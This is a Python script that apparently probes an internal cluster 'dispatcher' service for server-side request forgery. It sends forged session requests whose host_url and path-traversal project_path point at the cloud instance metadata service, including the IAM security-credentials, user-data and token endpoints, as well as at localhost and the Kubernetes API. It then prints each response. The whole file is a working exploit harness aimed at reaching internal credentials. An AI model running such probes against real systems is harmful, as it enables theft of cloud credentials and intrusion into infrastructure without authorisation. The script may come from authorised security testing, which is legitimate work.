#!/usr/bin/env python3
import json, os, time, urllib.error, urllib.request
BASE = os.environ.get('BUILDMODE_DISPATCHER_URL', 'http://lrs-pygencc-dispatcher-canv2.canv2-sl-app-launcher.svc.cluster.local')
USER = 'snapgpt-imds-probe-20261106@armorerlabs.com'
CASES = [
    ('imds_root', 'http://169.254.169.254', '../../../../latest/meta-data/'),
    ('imds_instance_id', 'http://169.254.169.254', '../../../../latest/meta-data/instance-id'),
    ('imds_roles', 'http://169.254.169.254', '../../../../latest/meta-data/iam/security-credentials/'),
    ('imds_identity', 'http://169.254.169.254', '../../../../latest/dynamic/instance-identity/document'),
    ('imds_userdata', 'http://169.254.169.254', '../../../../latest/user-data'),
    ('imds_token_get', 'http://169.254.169.254', '../../../../latest/api/token'),
    ('local_metrics', 'http://127.0.0.1:8080', '../../../../metrics'),
    ('local_openapi', 'http://127.0.0.1:8080', '../../../../openapi.json'),
    ('kube_http_version', 'http://kubernetes.default.svc', '../../../../version'),
    ('kube_http_healthz', 'http://kubernetes.default.svc', '../../../../healthz'),
    ('kube_http_livez', 'http://kubernetes.default.svc', '../../../../livez'),
    ('kube_http_readyz', 'http://kubernetes.default.svc', '../../../../readyz'),
]
out = {'utc': time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime()), 'base': BASE, 'cases': []}
for name, host, path in CASES:
    body = json.dumps({'user_id': USER, 'host_url': host, 'project_path': path, 'force': True}, separators=(',', ':')).encode()
    req = urllib.request.Request(BASE + '/session/init', data=body, method='POST', headers={'Content-Type': 'application/json', 'X-SL-Token': 'x'})
    started = time.monotonic(); rec = {'name': name, 'host_url': host, 'project_path': path}
    try:
        with urllib.request.urlopen(req, timeout=35) as r:
            rec.update(status=r.status, body=r.read(30000).decode('utf-8', 'replace'))
    except urllib.error.HTTPError as e:
        rec.update(status=e.code, body=e.read(30000).decode('utf-8', 'replace'))
    except Exception as e:
        rec.update(error=repr(e))
    rec['elapsed'] = round(time.monotonic() - started, 3)
    out['cases'].append(rec)
print(json.dumps(out, sort_keys=True, separators=(',', ':')))
